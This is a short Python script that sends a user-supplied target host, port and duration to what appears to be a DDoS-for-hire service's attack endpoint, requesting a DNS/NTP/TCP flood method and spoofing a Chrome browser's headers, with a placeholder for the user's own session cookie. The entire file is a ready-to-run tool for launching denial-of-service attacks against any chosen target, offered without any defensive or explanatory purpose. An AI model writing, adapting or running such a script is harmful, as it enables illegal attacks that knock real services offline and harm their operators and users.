import argparse
import requests

parser = argparse.ArgumentParser(description='Script description')
parser.add_argument('--host', type=str, required=True, help='Host value')
parser.add_argument('--port', type=str, required=True, help='Port value')
parser.add_argument('--time', type=str, required=True, help='Time value')

args = parser.parse_args()

host = args.host
port = args.port
time = args.time

url = 'https://freeddos.pw/ajax/attack'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Length': '56',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'get your owner cookie',
    'Origin': 'https://freeddos.pw',
    'Referer': 'https://freeddos.pw/',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'X-Requested-With': 'XMLHttpRequest',
    'Authority': 'freeddos.pw',
    'Method': 'POST',
    'Path': '/ajax/attack',
    'Scheme': 'https'
}

payload = {
    'host': host,
    'port': port,
    'time': time,
    'method': 'DNS_NTP_TCPMB'
}

response = requests.post(url, headers=headers, data=payload)

print(response.text)
